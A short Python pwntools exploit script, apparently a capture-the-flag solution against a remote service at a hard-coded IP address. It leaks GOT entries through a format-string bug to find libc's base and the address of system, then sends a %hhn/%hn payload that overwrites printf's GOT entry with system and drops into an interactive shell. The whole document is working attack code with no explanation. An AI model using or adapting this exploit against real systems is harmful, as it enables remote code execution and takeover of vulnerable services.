#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./"
ENV = {"LD_PRELOAD":"./libc.so.6"}

setvbuf_got = 0x601018
printf_got = 0x601020

# nc 47.75.182.113 9999
p = remote("47.75.182.113", 9999)

def leak(addr):
    p.sendline("%7$s"+"\x00"*4 + p64(addr))
    return u64(p.recv(6)+"\x00\x00")

setvbuf_addr = leak(setvbuf_got)
gets_addr = leak(0x601028)
log.info("setvbuf_addr: "+hex(setvbuf_addr))
log.info("gets_addr: "+hex(gets_addr))

libc_base = gets_addr-0x6ed80
log.info("libc_base: "+hex(libc_base))

system_addr = libc_base+0x45390
log.info("system_addr: "+hex(system_addr))

bit0 = system_addr%0x100
bit12 = system_addr%0x1000000/0x100

payload = "%"+str(bit0)+"x%10$hhn"
payload += "%"+str(bit12-bit0)+"x%11$hn"
payload += p8(0)*(0x20-len(payload))
payload += p64(printf_got)+p64(printf_got+1)
p.sendline(payload)

p.interactive()
